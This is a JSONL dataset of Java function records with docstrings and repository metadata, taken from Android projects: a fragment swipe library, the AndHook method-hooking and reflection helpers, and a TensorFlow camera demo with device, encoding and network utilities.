{"docstring": "/**\n * Create a fragment proxy object using the specified constructor.\n * It will be use the empty parameter constructor if not specify the primaryconstructor annotation\n * in constructor.\n *\n * @param fragment specified fragment class\n * @param args specified constructor parameters\n * @param <T> the child classes of android.app.fragment.\n *\n * @return fragment proxy object\n */\n", "func_signal": "public static <T extends android.app.Fragment> T newProxy(Class<? extends T> fragment, Object... args)", "code": "{\n    checkAnnotationNotEmpty(fragment);\n\n    try {\n        String className = fragment.getName() + \"_SnakeProxy\";\n        if(com.youngfeng.snake.app.Fragment.class.isAssignableFrom(fragment)) {\n            className = fragment.getName();\n        }\n        Class<?> snakeProxyClass = Class.forName(className);\n\n        Constructor<?>[] constructors = snakeProxyClass.getConstructors();\n\n        Constructor<?> primaryConstructor = null;\n\n        for (Constructor<?> constructor : constructors) {\n            PrimaryConstructor primaryConstructorAnno = constructor.getAnnotation(PrimaryConstructor.class);\n            if(null != primaryConstructorAnno) {\n                primaryConstructor = constructor;\n                break;\n            }\n        }\n\n        T result = null;\n        if(null != primaryConstructor) {\n            result = (T) primaryConstructor.newInstance(args);\n        } else {\n            result = (T) snakeProxyClass.newInstance();\n        }\n\n        return result;\n    } catch (Exception e) {\n        e.printStackTrace();\n    }\n\n    return null;\n}", "path": "snake\\src\\main\\java\\com\\youngfeng\\snake\\Snake.java", "repo_name": "yuanhoujun/Snake", "stars": 614, "license": "apache-2.0", "language": "java", "size": 6710}
{"docstring": "/**\n * Get enable state of the swipe up to home feature.\n *\n * @param activity the specified activity\n *\n * @return true: enable, false: disable\n */\n", "func_signal": "public static boolean swipeUpToHomeEnabled(@NonNull Activity activity)", "code": "{\n    assertActivityDestroyed(activity);\n\n    ViewGroup decorView = (ViewGroup) activity.getWindow().getDecorView();\n    View topWindowView = decorView.getChildAt(0);\n    if(topWindowView instanceof SnakeHackLayout) {\n        return ((SnakeHackLayout) topWindowView).swipeUpToHomeEnabled();\n    }\n\n    return false;\n}", "path": "snake\\src\\main\\java\\com\\youngfeng\\snake\\Snake.java", "repo_name": "yuanhoujun/Snake", "stars": 614, "license": "apache-2.0", "language": "java", "size": 6710}
{"docstring": "// Depend whether the method's name is onCreateView\n", "func_signal": "private boolean isOnCreateView(ExecutableElement element)", "code": "{\n    if(!\"onCreateView\".equals(element.getSimpleName().toString())) return false;\n\n    List<? extends VariableElement> parameters = element.getParameters();\n\n    // Diff parameters, need totally idenditify .\n    if(null == parameters || parameters.size() != 3) return false;\n    for(VariableElement parameter : parameters) {\n        if(!isTypeEqual(parameter.asType(), LAYOUT_INFLATER_TYPE)\n        && !isTypeEqual(parameter.asType(), VIEWGROUP_TYPE)\n        && !isTypeEqual(parameter.asType(), BUNDLE_TYPE)) {\n            return false;\n        }\n    }\n\n    return true;\n}", "path": "snake-compiler\\src\\main\\java\\com\\youngfeng\\snake\\compiler\\SnakeProcessor.java", "repo_name": "yuanhoujun/Snake", "stars": 614, "license": "apache-2.0", "language": "java", "size": 6710}
{"docstring": "/**\n * Turn the slide-off function on or off for fragment.\n *\n * @param fragment the specified fragment\n * @param enable true: turn on, false: turn off\n */\n", "func_signal": "public static void enableDragToClose(@NonNull android.app.Fragment fragment, boolean enable)", "code": "{\n    if(fragment instanceof com.youngfeng.snake.app.Fragment) {\n        ((Fragment) fragment).enableDragToClose(enable);\n    } else {\n        try {\n            Method method = fragment.getClass().getMethod(\"enableDragToClose\", Boolean.class);\n            method.invoke(fragment, enable);\n        } catch (Throwable e) {\n            if (e instanceof NoSuchMethodException) {\n                throw new SnakeConfigException(\"Plase use Snake.newProxy create a Fragment instance\");\n            } else {\n                e.printStackTrace();\n            }\n        }\n    }\n}", "path": "snake\\src\\main\\java\\com\\youngfeng\\snake\\Snake.java", "repo_name": "yuanhoujun/Snake", "stars": 614, "license": "apache-2.0", "language": "java", "size": 6710}
{"docstring": "/**\n * Like {@link #returnConstant(Object)}, but allows to specify a priority for the callback.\n *\n * @param priority See {@link XCallback#priority}.\n * @param result   The value that should be returned to callers of the hooked method.\n */\n", "func_signal": "public static XC_MethodReplacement returnConstant(final int priority, final Object result)", "code": "{\n    return new XC_MethodReplacement(priority) {\n        @Override\n        protected Object replaceHookedMethod(final MethodHookParam param) throws Throwable {\n            return result;\n        }\n    };\n}", "path": "lib\\src\\main\\java\\andhook\\lib\\xposed\\XC_MethodReplacement.java", "repo_name": "asLody/AndHook", "stars": 738, "license": "mit", "language": "java", "size": 7564}
{"docstring": "/**\n * Sets the value of a {@code boolean} field in the given object instance. A class reference is not sufficient! See also {@link #findField}.\n */\n", "func_signal": "public static void setBooleanField(final Object obj, final String fieldName, final boolean value)", "code": "{\n    try {\n        findField(obj.getClass(), fieldName).setBoolean(obj, value);\n    } catch (final IllegalAccessException e) {\n        // should not happen\n        Log.w(LOGTAG, e);\n        throw new IllegalAccessError(e.getMessage());\n    } catch (final IllegalArgumentException e) {\n        throw e;\n    }\n}", "path": "lib\\src\\main\\java\\andhook\\lib\\xposed\\XposedHelpers.java", "repo_name": "asLody/AndHook", "stars": 738, "license": "mit", "language": "java", "size": 7564}
{"docstring": "/**\n * Sets the value of a static {@code float} field in the given class. See also {@link #findField}.\n */\n", "func_signal": "public static void setStaticFloatField(final Class<?> clazz, final String fieldName, float value)", "code": "{\n    try {\n        findField(clazz, fieldName).setFloat(null, value);\n    } catch (final IllegalAccessException e) {\n        // should not happen\n        Log.w(LOGTAG, e);\n        throw new IllegalAccessError(e.getMessage());\n    } catch (final IllegalArgumentException e) {\n        throw e;\n    }\n}", "path": "lib\\src\\main\\java\\andhook\\lib\\xposed\\XposedHelpers.java", "repo_name": "asLody/AndHook", "stars": 738, "license": "mit", "language": "java", "size": 7564}
{"docstring": "/**\n * This can be used to store any data for the scope of the callback.\n * <p>\n * <p>Use this instead of instance variables, as it has a clear reference to e.g. each\n * separate call to a method, even when the same method is called recursively.\n *\n * @see #setObjectExtra\n * @see #getObjectExtra\n */\n", "func_signal": "public synchronized Bundle getExtra()", "code": "{\n    if (extra == null)\n        extra = new Bundle();\n    return extra;\n}", "path": "lib\\src\\main\\java\\andhook\\lib\\xposed\\callbacks\\XCallback.java", "repo_name": "asLody/AndHook", "stars": 738, "license": "mit", "language": "java", "size": 7564}
{"docstring": "/**\n * Sets the value of a static {@code long} field in the given class. See also {@link #findField}.\n */\n", "func_signal": "public static void setStaticLongField(final Class<?> clazz, final String fieldName, long value)", "code": "{\n    try {\n        findField(clazz, fieldName).setLong(null, value);\n    } catch (final IllegalAccessException e) {\n        // should not happen\n        Log.w(LOGTAG, e);\n        throw new IllegalAccessError(e.getMessage());\n    } catch (final IllegalArgumentException e) {\n        throw e;\n    }\n}", "path": "lib\\src\\main\\java\\andhook\\lib\\xposed\\XposedHelpers.java", "repo_name": "asLody/AndHook", "stars": 738, "license": "mit", "language": "java", "size": 7564}
{"docstring": "/**\n * Returns an array of all methods declared/overridden in a class with the specified parameter types.\n * <p>\n * <p>The return type is optional, it will not be compared if it is {@code null}.\n * Use {@code void.class} if you want to search for methods returning nothing.\n *\n * @param clazz          The class to look in.\n * @param returnType     The return type, or {@code null} (see above).\n * @param parameterTypes The parameter types.\n * @return An array with matching methods, all set to accessible already.\n */\n", "func_signal": "public static Method[] findMethodsByExactParameters(final Class<?> clazz, final Class<?> returnType,\n                                                    final Class<?>... parameterTypes)", "code": "{\n    final LinkedList<Method> result = new LinkedList<>();\n    for (final Method method : clazz.getDeclaredMethods()) {\n        if (returnType != null && returnType != method.getReturnType())\n            continue;\n\n        final Class<?>[] methodParameterTypes = method.getParameterTypes();\n        if (parameterTypes.length != methodParameterTypes.length)\n            continue;\n\n        boolean match = true;\n        for (int i = 0; i < parameterTypes.length; ++i) {\n            if (parameterTypes[i] != methodParameterTypes[i]) {\n                match = false;\n                break;\n            }\n        }\n\n        if (!match)\n            continue;\n\n        method.setAccessible(true);\n        result.add(method);\n    }\n    return result.toArray(new Method[result.size()]);\n}", "path": "lib\\src\\main\\java\\andhook\\lib\\xposed\\XposedHelpers.java", "repo_name": "asLody/AndHook", "stars": 738, "license": "mit", "language": "java", "size": 7564}
{"docstring": "/**\n * Returns the index of the first parameter declared with the given type.\n *\n * @throws NoSuchFieldError if there is no parameter with that type.\n */\n", "func_signal": "public static int getFirstParameterIndexByType(final Member method, final Class<?> type)", "code": "{\n    final Class<?>[] classes = (method instanceof Method) ?\n            ((Method) method).getParameterTypes() : ((Constructor<?>) method).getParameterTypes();\n    for (int i = 0; i < classes.length; ++i) {\n        if (classes[i] == type) {\n            return i;\n        }\n    }\n    throw new NoSuchFieldError(\"No parameter of type \" + type + \" found in \" + method);\n}", "path": "lib\\src\\main\\java\\andhook\\lib\\xposed\\XposedHelpers.java", "repo_name": "asLody/AndHook", "stars": 738, "license": "mit", "language": "java", "size": 7564}
{"docstring": "/**\n * Look up a constructor of a class and set it to accessible.\n * See {@link #findMethodExact(String, ClassLoader, String, Object...)} for details.\n */\n", "func_signal": "public static Constructor<?> findConstructorExact(final Class<?> clazz, final Class<?>... parameterTypes)", "code": "{\n    final String fullConstructorName = clazz.getName() + getParametersString(parameterTypes) + \"#exact\";\n\n    if (constructorCache.containsKey(fullConstructorName)) {\n        final Constructor<?> constructor = constructorCache.get(fullConstructorName);\n        if (constructor == null)\n            throw new NoSuchMethodError(fullConstructorName);\n        return constructor;\n    }\n\n    try {\n        final Constructor<?> constructor = clazz.getDeclaredConstructor(parameterTypes);\n        constructor.setAccessible(true);\n        constructorCache.put(fullConstructorName, constructor);\n        return constructor;\n    } catch (final NoSuchMethodException e) {\n        constructorCache.put(fullConstructorName, null);\n        throw new NoSuchMethodError(fullConstructorName);\n    }\n}", "path": "lib\\src\\main\\java\\andhook\\lib\\xposed\\XposedHelpers.java", "repo_name": "asLody/AndHook", "stars": 738, "license": "mit", "language": "java", "size": 7564}
{"docstring": "/**\n * Look up and return a method if it exists.\n * See {@link #findMethodExactIfExists(String, ClassLoader, String, Object...)} for details.\n */\n", "func_signal": "public static Method findMethodExactIfExists(final Class<?> clazz, final String methodName,\n                                             final Object... parameterTypes)", "code": "{\n    try {\n        return findMethodExact(clazz, methodName, parameterTypes);\n    } catch (final ClassNotFoundError | NoSuchMethodError e) {\n        return null;\n    }\n}", "path": "lib\\src\\main\\java\\andhook\\lib\\xposed\\XposedHelpers.java", "repo_name": "asLody/AndHook", "stars": 738, "license": "mit", "language": "java", "size": 7564}
{"docstring": "/**\n * Removes and returns a value which was stored with {@link #setAdditionalInstanceField}.\n *\n * @param obj The object instance for which the value has been stored.\n * @param key The key in the value map for this object instance.\n * @return The previously stored value for this instance/key combination, or {@code null} if there was none.\n */\n", "func_signal": "@SuppressWarnings(\"SynchronizationOnLocalVariableOrMethodParameter\")\npublic static Object removeAdditionalInstanceField(final Object obj, final String key)", "code": "{\n    if (obj == null)\n        throw new NullPointerException(\"object must not be null\");\n    if (key == null)\n        throw new NullPointerException(\"key must not be null\");\n\n    HashMap<String, Object> objectFields;\n    synchronized (additionalFields) {\n        objectFields = additionalFields.get(obj);\n        if (objectFields == null)\n            return null;\n    }\n\n    synchronized (objectFields) {\n        return objectFields.remove(key);\n    }\n}", "path": "lib\\src\\main\\java\\andhook\\lib\\xposed\\XposedHelpers.java", "repo_name": "asLody/AndHook", "stars": 738, "license": "mit", "language": "java", "size": 7564}
{"docstring": "/**\n * Returns an object stored with {@link #setObjectExtra}.\n */\n", "func_signal": "public Object getObjectExtra(String key)", "code": "{\n    Serializable o = getExtra().getSerializable(key);\n    if (o instanceof SerializeWrapper)\n        return ((SerializeWrapper) o).object;\n    return null;\n}", "path": "lib\\src\\main\\java\\andhook\\lib\\xposed\\callbacks\\XCallback.java", "repo_name": "asLody/AndHook", "stars": 738, "license": "mit", "language": "java", "size": 7564}
{"docstring": "/**\n * Gets the number of steps required to promote a primitive number to another\n * type.\n *\n * @param srcClass  the (primitive) source class\n * @param destClass the (primitive) destination class\n * @return The cost of promoting the primitive\n */\n", "func_signal": "private static float getPrimitivePromotionCost(final Class<?> srcClass, final Class<?> destClass)", "code": "{\n    float cost = 0.0f;\n    Class<?> cls = srcClass;\n    if (!cls.isPrimitive()) {\n        // slight unwrapping penalty\n        cost += 0.1f;\n        cls = ClassUtils.wrapperToPrimitive(cls);\n    }\n    for (int i = 0; cls != destClass && i < ORDERED_PRIMITIVE_TYPES.length; i++) {\n        if (cls == ORDERED_PRIMITIVE_TYPES[i]) {\n            cost += 0.1f;\n            if (i < ORDERED_PRIMITIVE_TYPES.length - 1) {\n                cls = ORDERED_PRIMITIVE_TYPES[i + 1];\n            }\n        }\n    }\n    return cost;\n}", "path": "lib\\src\\main\\java\\andhook\\lib\\xposed\\MemberUtils.java", "repo_name": "asLody/AndHook", "stars": 738, "license": "mit", "language": "java", "size": 7564}
{"docstring": "/**\n * Returns the value of an object field in the given object instance. A class reference is not sufficient! See also {@link #findField}.\n */\n", "func_signal": "public static Object getObjectField(Object obj, final String fieldName)", "code": "{\n    try {\n        return findField(obj.getClass(), fieldName).get(obj);\n    } catch (final IllegalAccessException e) {\n        // should not happen\n        Log.w(LOGTAG, e);\n        throw new IllegalAccessError(e.getMessage());\n    } catch (final IllegalArgumentException e) {\n        throw e;\n    }\n}", "path": "lib\\src\\main\\java\\andhook\\lib\\xposed\\XposedHelpers.java", "repo_name": "asLody/AndHook", "stars": 738, "license": "mit", "language": "java", "size": 7564}
{"docstring": "/**\n * Returns the first field of the given type in a class.\n * Might be useful for Proguard'ed classes to identify fields with unique types.\n *\n * @param clazz The class which either declares or inherits the field.\n * @param type  The type of the field.\n * @return A reference to the first field of the given type.\n * @throws NoSuchFieldError In case no matching field was not found.\n */\n", "func_signal": "public static Field findFirstFieldByExactType(final Class<?> clazz, final Class<?> type)", "code": "{\n    Class<?> clz = clazz;\n    do {\n        for (final Field field : clz.getDeclaredFields()) {\n            if (field.getType() == type) {\n                field.setAccessible(true);\n                return field;\n            }\n        }\n    } while ((clz = clz.getSuperclass()) != null);\n\n    throw new NoSuchFieldError(\"Field of type \" + type.getName() + \" in class \" + clazz.getName());\n}", "path": "lib\\src\\main\\java\\andhook\\lib\\xposed\\XposedHelpers.java", "repo_name": "asLody/AndHook", "stars": 738, "license": "mit", "language": "java", "size": 7564}
{"docstring": "/**\n * Returns the value of a static {@code boolean} field in the given class. See also {@link #findField}.\n */\n", "func_signal": "public static boolean getStaticBooleanField(final Class<?> clazz, final String fieldName)", "code": "{\n    try {\n        return findField(clazz, fieldName).getBoolean(null);\n    } catch (final IllegalAccessException e) {\n        // should not happen\n        Log.w(LOGTAG, e);\n        throw new IllegalAccessError(e.getMessage());\n    } catch (final IllegalArgumentException e) {\n        throw e;\n    }\n}", "path": "lib\\src\\main\\java\\andhook\\lib\\xposed\\XposedHelpers.java", "repo_name": "asLody/AndHook", "stars": 738, "license": "mit", "language": "java", "size": 7564}
{"docstring": "/**\n * Sets the value of a static {@code byte} field in the given class. See also {@link #findField}.\n */\n", "func_signal": "public static void setStaticByteField(final Class<?> clazz, final String fieldName, byte value)", "code": "{\n    try {\n        findField(clazz, fieldName).setByte(null, value);\n    } catch (final IllegalAccessException e) {\n        // should not happen\n        Log.w(LOGTAG, e);\n        throw new IllegalAccessError(e.getMessage());\n    } catch (final IllegalArgumentException e) {\n        throw e;\n    }\n}", "path": "lib\\src\\main\\java\\andhook\\lib\\xposed\\XposedHelpers.java", "repo_name": "asLody/AndHook", "stars": 738, "license": "mit", "language": "java", "size": 7564}
{"docstring": "/**\n * Returns an array with the classes of the given objects.\n */\n", "func_signal": "public static Class<?>[] getParameterTypes(final Object... args)", "code": "{\n    final Class<?>[] clazzes = new Class<?>[args.length];\n    for (int i = 0; i < args.length; i++) {\n        clazzes[i] = (args[i] != null) ? args[i].getClass() : null;\n    }\n    return clazzes;\n}", "path": "lib\\src\\main\\java\\andhook\\lib\\xposed\\XposedHelpers.java", "repo_name": "asLody/AndHook", "stars": 738, "license": "mit", "language": "java", "size": 7564}
{"docstring": "/**\n * Sets the value of a static {@code double} field in the given class. See also {@link #findField}.\n */\n", "func_signal": "public static void setStaticDoubleField(final Class<?> clazz, final String fieldName, double value)", "code": "{\n    try {\n        findField(clazz, fieldName).setDouble(null, value);\n    } catch (final IllegalAccessException e) {\n        // should not happen\n        Log.w(LOGTAG, e);\n        throw new IllegalAccessError(e.getMessage());\n    } catch (final IllegalArgumentException e) {\n        throw e;\n    }\n}", "path": "lib\\src\\main\\java\\andhook\\lib\\xposed\\XposedHelpers.java", "repo_name": "asLody/AndHook", "stars": 738, "license": "mit", "language": "java", "size": 7564}
{"docstring": "/**\n * Sets the value of a static {@code int} field in the given class. See also {@link #findField}.\n */\n", "func_signal": "public static int getStaticIntField(final Class<?> clazz, final String fieldName)", "code": "{\n    try {\n        return findField(clazz, fieldName).getInt(null);\n    } catch (final IllegalAccessException e) {\n        // should not happen\n        Log.w(LOGTAG, e);\n        throw new IllegalAccessError(e.getMessage());\n    } catch (final IllegalArgumentException e) {\n        throw e;\n    }\n}", "path": "lib\\src\\main\\java\\andhook\\lib\\xposed\\XposedHelpers.java", "repo_name": "asLody/AndHook", "stars": 738, "license": "mit", "language": "java", "size": 7564}
{"docstring": "/**\n * Returns the sum of the object transformation cost for each class in the\n * source argument list.\n *\n * @param srcArgs  The source arguments\n * @param destArgs The destination arguments\n * @return The total transformation cost\n */\n", "func_signal": "private static float getTotalTransformationCost(Class<?>[] srcArgs, Class<?>[] destArgs)", "code": "{\n    float totalCost = 0.0f;\n    for (int i = 0; i < srcArgs.length; i++) {\n        Class<?> srcClass, destClass;\n        srcClass = srcArgs[i];\n        destClass = destArgs[i];\n        totalCost += getObjectTransformationCost(srcClass, destClass);\n    }\n    return totalCost;\n}", "path": "lib\\src\\main\\java\\andhook\\lib\\xposed\\MemberUtils.java", "repo_name": "asLody/AndHook", "stars": 738, "license": "mit", "language": "java", "size": 7564}
{"docstring": "/**\n * \u542f\u52a8\u540e\u53f0\u7ebf\u7a0b\n */\n", "func_signal": "private void startBackgroundThread()", "code": "{\n    backgroundThread = new HandlerThread(HANDLE_THREAD_NAME);\n    backgroundThread.start();\n    backgroundHandler = new Handler(backgroundThread.getLooper());\n    synchronized (lock) {\n        runClassifier = true;\n    }\n    backgroundHandler.post(periodicClassify);\n}", "path": "app\\src\\main\\java\\com\\tfcamerademo\\Camera2BasicFragment4.java", "repo_name": "yuxitong/TensorFlowAndroidDemo", "stars": 696, "license": "None", "language": "java", "size": 212432}
{"docstring": "/**\n * \u6beb\u79d2\u65f6\u95f4\u6233\u5355\u4f4d\u8f6c\u6362\uff08\u5355\u4f4d\uff1aunit\uff09\n *\n * @param milliseconds \u6beb\u79d2\u65f6\u95f4\u6233\n * @param unit         <ul>\n *                     <li>{@link TimeUnit#MSEC}: \u6beb\u79d2</li>\n *                     <li>{@link TimeUnit#SEC }: \u79d2</li>\n *                     <li>{@link TimeUnit#MIN }: \u5206</li>\n *                     <li>{@link TimeUnit#HOUR}: \u5c0f\u65f6</li>\n *                     <li>{@link TimeUnit#DAY }: \u5929</li>\n *                     </ul>\n * @return unit\u65f6\u95f4\u6233\n */\n", "func_signal": "private static long milliseconds2Unit(long milliseconds, TimeUnit unit)", "code": "{\n    switch (unit) {\n        case MSEC:\n            return milliseconds / MSEC;\n        case SEC:\n            return milliseconds / SEC;\n        case MIN:\n            return milliseconds / MIN;\n        case HOUR:\n            return milliseconds / HOUR;\n        case DAY:\n            return milliseconds / DAY;\n    }\n    return -1;\n}", "path": "app\\src\\main\\java\\com\\tfcamerademo\\utils\\TimeUtils.java", "repo_name": "yuxitong/TensorFlowAndroidDemo", "stars": 696, "license": "None", "language": "java", "size": 212432}
{"docstring": "/**\n * \u52a0\u8f7d\u6a21\u578b\u4e0e\u6807\u7b7e\n */\n", "func_signal": "@Override\npublic void onActivityCreated(Bundle savedInstanceState)", "code": "{\n    super.onActivityCreated(savedInstanceState);\n    try {\n        // create either a new ImageClassifierQuantizedMobileNet or an ImageClassifierFloatInception\n        classifier = TensorFlowObjectDetectionAPIModel.create(\n                this.getActivity().getAssets(), TF_OD_API_MODEL_FILE, TF_OD_API_LABELS_FILE, TF_OD_API_INPUT_SIZE);\n    } catch (IOException e) {\n        Log.e(TAG, \"Failed to initialize an image classifier.\");\n    }\n    startBackgroundThread();\n}", "path": "app\\src\\main\\java\\com\\tfcamerademo\\Camera2BasicFragment4.java", "repo_name": "yuxitong/TensorFlowAndroidDemo", "stars": 696, "license": "None", "language": "java", "size": 212432}
{"docstring": "/**\n * Connect the buttons to their event handler.\n */\n", "func_signal": "@Override\npublic void onViewCreated(final View view, Bundle savedInstanceState)", "code": "{\n    textureView = (AutoFitTextureView) view.findViewById(R.id.texture);\n    textView = (TextView) view.findViewById(R.id.text);\n    imageView = (ImageView) view.findViewById(R.id.imageView);\n}", "path": "app\\src\\main\\java\\com\\tfcamerademo\\Camera2BasicFragment3.java", "repo_name": "yuxitong/TensorFlowAndroidDemo", "stars": 696, "license": "None", "language": "java", "size": 212432}
{"docstring": "/**\n * Shows a {@link Toast} on the UI thread for the classification results.\n *\n * @param text The message to show\n */\n", "func_signal": "private void showToast(final String text)", "code": "{\n    final Activity activity = getActivity();\n    if (activity != null) {\n        activity.runOnUiThread(\n                new Runnable() {\n                    @Override\n                    public void run() {\n                        textView.setText(text);\n                    }\n                });\n    }\n}", "path": "app\\src\\main\\java\\com\\tfcamerademo\\Camera2BasicFragment4.java", "repo_name": "yuxitong/TensorFlowAndroidDemo", "stars": 696, "license": "None", "language": "java", "size": 212432}
{"docstring": "/**\n * \u83b7\u53d6\u8bbe\u5907MAC\u5730\u5740\n * <p>\n * <p>\u9700\u6dfb\u52a0\u6743\u9650 {@code <uses-permission android:name=\"android.permission.ACCESS_WIFI_STATE\"/>}</p>\n *\n * @return MAC\u5730\u5740\n */\n", "func_signal": "public static String getMacAddress()", "code": "{\n    String macAddress = null;\n    LineNumberReader reader = null;\n    try {\n        Process pp = Runtime.getRuntime().exec(\"cat /sys/class/net/wlan0/address\");\n        InputStreamReader ir = new InputStreamReader(pp.getInputStream());\n        reader = new LineNumberReader(ir);\n        macAddress = reader.readLine().replace(\":\", \"\");\n    } catch (IOException ex) {\n        ex.printStackTrace();\n    } finally {\n        try {\n            if (reader != null) reader.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    return macAddress == null ? \"\" : macAddress;\n}", "path": "app\\src\\main\\java\\com\\tfcamerademo\\utils\\DeviceUtils.java", "repo_name": "yuxitong/TensorFlowAndroidDemo", "stars": 696, "license": "None", "language": "java", "size": 212432}
{"docstring": "//\u83b7\u53d6\u8f6f\u4ef6\u7248\u672c\u53f7\n", "func_signal": "public static String getSoftwareVersion()", "code": "{\n    String getSoftwareVersion= _getSystemProperties(\"banben.product.swversion\");\n    if(getSoftwareVersion !=null){\n        return getSoftwareVersion;\n    }else{\n        return \"\";\n    }\n}", "path": "app\\src\\main\\java\\com\\tfcamerademo\\utils\\DeviceUtils.java", "repo_name": "yuxitong/TensorFlowAndroidDemo", "stars": 696, "license": "None", "language": "java", "size": 212432}
{"docstring": "/**\n * URL\u89e3\u7801\n * <p>\u82e5\u7cfb\u7edf\u4e0d\u652f\u6301\u6307\u5b9a\u7684\u89e3\u7801\u5b57\u7b26\u96c6,\u5219\u76f4\u63a5\u5c06input\u539f\u6837\u8fd4\u56de</p>\n *\n * @param input   \u8981\u89e3\u7801\u7684\u5b57\u7b26\u4e32\n * @param charset \u5b57\u7b26\u96c6\n * @return URL\u89e3\u7801\u4e3a\u6307\u5b9a\u5b57\u7b26\u96c6\u7684\u5b57\u7b26\u4e32\n */\n", "func_signal": "public static String urlDecode(String input, String charset)", "code": "{\n    try {\n        return URLDecoder.decode(input, charset);\n\n    } catch (UnsupportedEncodingException e) {\n        return input;\n\n    }\n\n}", "path": "app\\src\\main\\java\\com\\tfcamerademo\\utils\\EncodeUtils.java", "repo_name": "yuxitong/TensorFlowAndroidDemo", "stars": 696, "license": "None", "language": "java", "size": 212432}
{"docstring": "/**\n * Starts a background thread and its {@link Handler}.\n */\n", "func_signal": "private void startBackgroundThread()", "code": "{\n    backgroundThread = new HandlerThread(HANDLE_THREAD_NAME);\n    backgroundThread.start();\n    backgroundHandler = new Handler(backgroundThread.getLooper());\n    synchronized (lock) {\n        runClassifier = true;\n    }\n    backgroundHandler.post(periodicClassify);\n}", "path": "app\\src\\main\\java\\com\\tfcamerademo\\Camera2BasicFragment3.java", "repo_name": "yuxitong/TensorFlowAndroidDemo", "stars": 696, "license": "None", "language": "java", "size": 212432}
{"docstring": "/**\n * \u83b7\u53d6\u8bbe\u5907\u578b\u53f7\uff0c\u5982MI2SC\n *\n * @return \u8bbe\u5907\u578b\u53f7\n */\n", "func_signal": "public static String getModel()", "code": "{\n    String model = Build.MODEL;\n    if (model != null) {\n        model = model.trim().replaceAll(\"\\\\s*\", \"\");\n    } else {\n        model = \"\";\n    }\n    return model;\n}", "path": "app\\src\\main\\java\\com\\tfcamerademo\\utils\\DeviceUtils.java", "repo_name": "yuxitong/TensorFlowAndroidDemo", "stars": 696, "license": "None", "language": "java", "size": 212432}
{"docstring": "/**\n * UI\u63a7\u4ef6\u7ed1\u5b9a\n */\n", "func_signal": "@Override\npublic void onViewCreated(final View view, Bundle savedInstanceState)", "code": "{\n    textureView = (AutoFitTextureView) view.findViewById(R.id.texture);\n    textView = (TextView) view.findViewById(R.id.text);\n    imageView = (ImageView) view.findViewById(R.id.imageView);\n}", "path": "app\\src\\main\\java\\com\\tfcamerademo\\Camera2BasicFragment4.java", "repo_name": "yuxitong/TensorFlowAndroidDemo", "stars": 696, "license": "None", "language": "java", "size": 212432}
{"docstring": "/**\n * Html\u7f16\u7801\n *\n * @param input \u8981Html\u7f16\u7801\u7684\u5b57\u7b26\u4e32\n * @return Html\u7f16\u7801\u540e\u7684\u5b57\u7b26\u4e32\n */\n", "func_signal": "public static String htmlEncode(String input)", "code": "{\n    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {\n        return Html.escapeHtml(input);\n\n    } else {\n        // \u53c2\u7167Html.escapeHtml()\u4e2d\u4ee3\u7801\n        StringBuilder out = new StringBuilder();\n        for (int i = 0, len = input.length(); i < len; i++) {\n            char c = input.charAt(i);\n            if (c == '<') {\n                out.append(\"&lt;\");\n\n            } else if (c == '>') {\n                out.append(\"&gt;\");\n\n            } else if (c == '&') {\n                out.append(\"&amp;\");\n\n            } else if (c >= 0xD800 && c <= 0xDFFF) {\n                if (c < 0xDC00 && i + 1 < len) {\n                    char d = input.charAt(i + 1);\n                    if (d >= 0xDC00 && d <= 0xDFFF) {\n                        i++;\n\n                        int codepoint = 0x010000 | (int) c - 0xD800 << 10 | (int) d - 0xDC00;\n                        out.append(\"&#\").append(codepoint).append(\";\");\n\n                    }\n\n                }\n\n            } else if (c > 0x7E || c < ' ') {\n                out.append(\"&#\").append((int) c).append(\";\");\n\n            } else if (c == ' ') {\n                while (i + 1 < len && input.charAt(i + 1) == ' ') {\n                    out.append(\"&nbsp;\");\n                    i++;\n\n                }\n                out.append(' ');\n\n            } else {\n                out.append(c);\n\n            }\n\n        }\n        return out.toString();\n\n    }\n\n}", "path": "app\\src\\main\\java\\com\\tfcamerademo\\utils\\EncodeUtils.java", "repo_name": "yuxitong/TensorFlowAndroidDemo", "stars": 696, "license": "None", "language": "java", "size": 212432}
{"docstring": "/**\n * Closes the current {@link CameraDevice}.\n */\n", "func_signal": "@SuppressLint(\"NewApi\")\nprivate void closeCamera()", "code": "{\n    try {\n        cameraOpenCloseLock.acquire();\n        if (null != captureSession) {\n            captureSession.close();\n            captureSession = null;\n        }\n        if (null != cameraDevice) {\n            cameraDevice.close();\n            cameraDevice = null;\n        }\n        if (null != imageReader) {\n            imageReader.close();\n            imageReader = null;\n        }\n    } catch (InterruptedException e) {\n        throw new RuntimeException(\"Interrupted while trying to lock camera closing.\", e);\n    } finally {\n        cameraOpenCloseLock.release();\n    }\n}", "path": "app\\src\\main\\java\\com\\tfcamerademo\\Camera2BasicFragment3.java", "repo_name": "yuxitong/TensorFlowAndroidDemo", "stars": 696, "license": "None", "language": "java", "size": 212432}
{"docstring": "/**\n * \u68c0\u67e5\u5f53\u524d\u7f51\u7edc\u662f\u5426\u53ef\u7528\n *\n * @param activity\n * @return\n */\n", "func_signal": "public static boolean isNetworkAvailable(Context activity)", "code": "{\n    Context context = activity.getApplicationContext();\n    // \u83b7\u53d6\u624b\u673a\u6240\u6709\u8fde\u63a5\u7ba1\u7406\u5bf9\u8c61\uff08\u5305\u62ec\u5bf9wi-fi,net\u7b49\u8fde\u63a5\u7684\u7ba1\u7406\uff09\n    ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);\n\n    if (connectivityManager == null)\n    {\n        return false;\n    }\n    else\n    {\n        // \u83b7\u53d6NetworkInfo\u5bf9\u8c61\n        NetworkInfo[] networkInfo = connectivityManager.getAllNetworkInfo();\n\n        if (networkInfo != null && networkInfo.length > 0)\n        {\n            for (int i = 0; i < networkInfo.length; i++)\n            {\n                System.out.println(i + \"===\u72b6\u6001===\" + networkInfo[i].getState());\n                System.out.println(i + \"===\u7c7b\u578b===\" + networkInfo[i].getTypeName());\n                // \u5224\u65ad\u5f53\u524d\u7f51\u7edc\u72b6\u6001\u662f\u5426\u4e3a\u8fde\u63a5\u72b6\u6001\n                if (networkInfo[i].getState() == NetworkInfo.State.CONNECTED)\n                {\n                    return true;\n                }\n            }\n        }\n    }\n    return false;\n}", "path": "app\\src\\main\\java\\com\\tfcamerademo\\utils\\NetUtils.java", "repo_name": "yuxitong/TensorFlowAndroidDemo", "stars": 696, "license": "None", "language": "java", "size": 212432}
